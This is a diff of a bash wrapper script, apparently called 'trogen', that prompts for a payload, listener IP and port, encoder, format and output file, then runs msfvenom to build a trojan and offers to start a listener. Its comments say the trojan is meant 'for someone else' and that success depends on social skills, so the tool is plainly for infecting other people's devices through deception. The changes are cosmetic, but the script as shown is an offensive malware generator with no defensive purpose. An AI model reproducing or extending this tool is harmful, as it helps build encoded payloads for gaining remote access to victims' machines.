@@ -2,7 +2,9 @@
 #Note for wan you must portforward your router, Or generate a trojan for someone else who was.
 #You must have good social skills to use this attack method successfully 
 clear
+cd /root/scripts/trogen
 cat banners/banner1
+echo "=========================================================================================="
 echo "------------------------------------------------------------------------------------------"
 echo 'payload: ' 
 cd payload
@@ -11,7 +13,7 @@ echo "--------------------------------------------------------------------------
 echo "Please enter IP Adress of the device to bind to the listener to" 
 echo "Leave blank if you don't plan to start a listener after"
 echo "Getting Current interface IP Adresses"
-echo "************ "
+echo "************"
 ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
 echo "************"
 read lhost
@@ -22,9 +24,6 @@ read host
 echo "------------------------------------------------------------------------------------------"
 echo 'lport: '
 read -e lport
-echo "------------------------------------------------------------------------------------------"
-echo 'lhost: '
-read lhost
 echo "------------------------------------------------------------------------------------------"
 echo 'encoder: ' 
 cd ../encoder
@@ -38,8 +37,10 @@ cd ../format
 read -e format 
 echo "------------------------------------------------------------------------------------------"
 echo 'output: ' 
-cd ../
 read -e output
+cd ../
+echo "------------------------------------------------------------------------------------------"
+echo "=========================================================================================="
 msfvenom -p $payload lhost=$lhost lport=$lport -e $encoder -i $itirations -f $format -o $output
 
 echo "Would you like to start a listener for your newly generated trojan?"
